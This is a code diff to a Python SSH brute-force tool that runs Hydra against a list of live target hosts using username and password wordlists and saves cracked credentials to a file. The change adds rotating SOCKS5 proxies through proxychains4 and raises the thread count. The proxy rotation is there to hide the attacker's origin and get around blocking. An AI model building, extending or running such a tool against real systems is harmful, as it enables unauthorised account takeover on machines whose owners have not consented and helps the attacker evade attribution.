@@ -1,6 +1,8 @@
-from globals import global_live_hosts  # Import global variables
+from globals import global_live_hosts, global_tested_proxies  # Import global variables
 import subprocess
 import os
+import random
+from itertools import cycle
 
 
 def load_wordlists():
@@ -35,9 +37,9 @@ def load_wordlists():
     return usernames, passwords
 
 
-def bruteforce_ssh(targets, usernames, passwords, max_threads=1):
+def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
     """
-    Perform SSH brute force attack using Hydra.
+    Perform SSH brute force attack using Hydra and SOCKS5 proxies.
 
     :param targets: List of target hosts to attack
     :param usernames: List of usernames to test
@@ -47,18 +49,31 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=1):
     results_file = "results/cracked.txt"
     print("[INFO] Starting brute force attack...")
 
+    if not global_tested_proxies:
+        print("[ERROR] No valid SOCKS5 proxies found. Load and test proxies first.")
+        return
+
+    # Cycle through available proxies
+    proxy_cycle = cycle(global_tested_proxies)
+
     for target in targets:
         print(f"[INFO] Targeting {target}...")
 
+        # Get the next available proxy
+        proxy_host, proxy_port = next(proxy_cycle)
+
         try:
-            # Call Hydra for brute forcing
+            print(f"[INFO] Using SOCKS5 Proxy: {proxy_host}:{proxy_port}")
+
+            # Run Hydra with the proxy
             subprocess.run(
                 [
+                    "proxychains4",  # ProxyChains must be installed for this to work
                     "hydra",
                     "-L",
-                    "wordlists/usernames.txt",
+                    "wordlists/ssh_usernames.txt",
                     "-P",
-                    "wordlists/passwords.txt",
+                    "wordlists/ssh_passwords.txt",
                     target,
                     "ssh",
                     "-o",
@@ -69,10 +84,11 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=1):
                 ],
                 check=True,
             )
+
             print(f"[INFO] Results saved to {results_file}")
 
         except FileNotFoundError:
-            print("[ERROR] Hydra is not installed or not found in PATH. Please install Hydra.")
+            print("[ERROR] Hydra or ProxyChains is not installed or not found in PATH.")
         except subprocess.CalledProcessError:
             print(f"[ERROR] Hydra failed to brute force {target}.")
         except Exception as e:
